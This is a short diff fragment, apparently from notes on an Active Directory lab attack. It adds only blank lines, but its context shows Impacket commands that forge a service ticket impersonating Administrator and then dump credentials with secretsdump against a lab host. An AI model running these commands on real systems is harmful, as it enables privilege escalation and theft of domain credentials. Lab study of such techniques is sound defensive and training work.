@@ -33,3 +33,5 @@ getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administr
 export KRB5CCNAME=administrator.ccache  
 secretsdump.py -k -no-pass target.lab.local  
 ```
+
+
